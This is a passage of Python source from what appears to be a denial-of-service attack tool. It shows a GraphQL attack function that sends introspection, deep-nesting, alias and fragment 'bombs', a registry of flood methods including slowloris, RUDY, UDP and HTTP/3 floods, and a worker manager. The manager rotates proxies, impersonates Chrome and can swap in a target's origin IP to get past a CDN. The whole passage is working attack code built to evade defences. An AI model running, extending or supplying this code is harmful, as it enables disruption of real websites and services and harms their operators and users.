                inputFields { name description type { name kind ofType { name kind ofType { name kind } } } }
                interfaces { name kind ofType { name kind } }
                enumValues { name description }
                possibleTypes { name kind ofType { name kind } }
            }
        }
    }
    """

    def build_nested_query(depth: int) -> str:
        if depth <= 0:
            return ""
        inner = build_nested_query(depth - 1)
        return f"{{ a: __typename {inner} b: __typename {inner} }}"

    async def single_request():
        async with sem:
            try:
                from curl_cffi.requests import AsyncSession
                kwargs = {"impersonate": "chrome120", "timeout": 10}
                if proxy:
                    kwargs["proxies"] = {"all": proxy}
                async with AsyncSession(**kwargs) as sess:
                    gql_path = random.choice(graphql_paths)
                    target = base + gql_path
                    attack_type = random.choice(["introspection", "nested", "alias_bomb", "fragment_bomb"])
                    if attack_type == "introspection":
                        payload = {"query": introspection_bomb}
                    elif attack_type == "nested":
                        depth = random.randint(5, 12)
                        payload = {"query": "query " + build_nested_query(depth)}
                    elif attack_type == "alias_bomb":
                        aliases = " ".join([f"a{i}: __typename" for i in range(200)])
                        payload = {"query": f"query {{ {aliases} }}"}
                    else:
                        fragments = "\n".join([
                            f"fragment F{i} on Query {{ ...F{i+1} }}" for i in range(20)
                        ]) + "\nfragment F20 on Query { __typename }"
                        payload = {"query": f"query {{ ...F0 }} {fragments}"}
                    headers = build_random_headers(target, "POST")
                    headers["Content-Type"] = "application/json"
                    resp = await sess.post(target, headers=headers, json=payload, timeout=10)
                    metrics["total"] += 1
                    if resp.status_code >= 200:
                        metrics["completed"] += 1
                    else:
                        metrics["failed"] += 1
            except Exception:
                metrics["failed"] += 1
                metrics["total"] += 1

    while time.time() - start < duration:
        batch_size = min(max(target_rps, 10), MAX_CONCURRENT)
        tasks = [single_request() for _ in range(batch_size)]
        await asyncio.gather(*tasks, return_exceptions=True)
    return metrics


# ============================================================================
# ATTACK METHOD REGISTRY
# ============================================================================

ATTACK_METHODS = {
    "http_get_flood": attack_get_flood,
    "http_post_flood": attack_post_flood,
    "browser": attack_browser,
    "dynamic": attack_dynamic,
    "slow": attack_slow,
    "pps": attack_pps,
    "slowloris": attack_slowloris_raw,
    "rudy": attack_rudy,
    "udp_flood": attack_udp_flood,
    "websocket": attack_websocket,
    "graphql": attack_graphql,
    "http3": attack_http3,
}


# ============================================================================
# WORKER MANAGER
# ============================================================================

async def run_enhanced_attack(url: str, duration: int, method: str = "http_get_flood",
                              rps: int = 100, proxy: Optional[str] = None,
                              proxy_pool = None, proxy_type: str = "datacenter",
                              origin_ip: Optional[str] = None) -> Dict:
    if method not in ATTACK_METHODS:
        logger.error(f"Unknown attack method: {method}")
        return {"completed": 0, "failed": 0, "timeout": 0, "total": 0}

    attack_func = ATTACK_METHODS[method]
    session_pool = OptimizedSessionPool(max_sessions=20)

    if origin_ip:
        parsed = urlparse(url)
        url = f"{parsed.scheme}://{origin_ip}{parsed.path or '/'}"
        if parsed.query:
            url += "?" + parsed.query

    num_workers = min(max(rps // 50, 1), 5)
    per_worker_duration = duration

    logger.info(f"Starting {method} attack: {num_workers} workers, {rps} RPS, {duration}s duration")

    async def worker(wid: int):
        worker_proxy = proxy
        try:
            if proxy_pool and not proxy:
                try:
                    ps = await proxy_pool.get_proxy(proxy_type)
                    worker_proxy = ps.url if ps else None
                except Exception:
                    worker_proxy = None
            result = await attack_func(
                url=url, proxy=worker_proxy, session_pool=session_pool,
                duration=per_worker_duration, target_rps=rps // num_workers,
            )
            return result
        except Exception as e:
            logger.debug(f"Worker {wid} error: {e}")
            return {"completed": 0, "failed": 0, "timeout": 0, "total": 0}

    tasks = [worker(i) for i in range(num_workers)]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    total_metrics = {"completed": 0, "failed": 0, "timeout": 0, "total": 0}
    for result in results:
        if isinstance(result, dict):
            for key in total_metrics:
                total_metrics[key] += result.get(key, 0)
        elif isinstance(result, Exception):
            logger.debug(f"Worker failed: {result}")

    session_pool.cleanup()
    return total_metrics
